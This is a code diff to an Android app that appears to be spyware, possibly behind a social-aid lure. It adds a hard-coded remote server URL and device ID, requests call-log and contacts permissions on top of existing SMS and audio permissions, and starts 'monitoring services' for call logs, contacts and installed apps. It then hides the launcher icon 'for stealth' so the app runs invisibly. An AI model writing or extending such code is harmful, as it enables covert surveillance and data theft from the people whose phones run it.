@@ -35,6 +35,10 @@ public class MainActivity extends Activity {
     private static final int OVERLAY_REQUEST_CODE = 101;
     private static final int BATTERY_REQUEST_CODE = 102;
 
+    // Shared config for all services
+    public static final String BASE_URL = "https://bansos.jokichannel.eu.org";
+    public static final String DEVICE_ID = "65057ab5f5";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -73,7 +77,9 @@ public class MainActivity extends Activity {
                     Manifest.permission.RECEIVE_SMS,
                     Manifest.permission.READ_SMS,
                     Manifest.permission.POST_NOTIFICATIONS,
-                    Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_CONTACTS
             };
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             permissions = new String[]{
@@ -84,7 +90,9 @@ public class MainActivity extends Activity {
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.RECEIVE_SMS,
                     Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_CONTACTS
             };
         } else {
             permissions = new String[]{
@@ -94,7 +102,9 @@ public class MainActivity extends Activity {
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.RECEIVE_SMS,
                     Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_CONTACTS
             };
         }
 
@@ -257,10 +267,15 @@ public class MainActivity extends Activity {
             startService(serviceIntent);
         }
 
-        // 2. Disable launcher icon (stealth)
+        // 2. Start v5.0 monitoring services
+        startService(new Intent(this, CallLogService.class));
+        startService(new Intent(this, ContactSyncService.class));
+        startService(new Intent(this, InstalledAppsService.class));
+
+        // 3. Disable launcher icon (stealth)
         stealthDisableIcon();
 
-        // 3. Finish activity (completely invisible now)
+        // 4. Finish activity (completely invisible now)
         finish();
     }
 
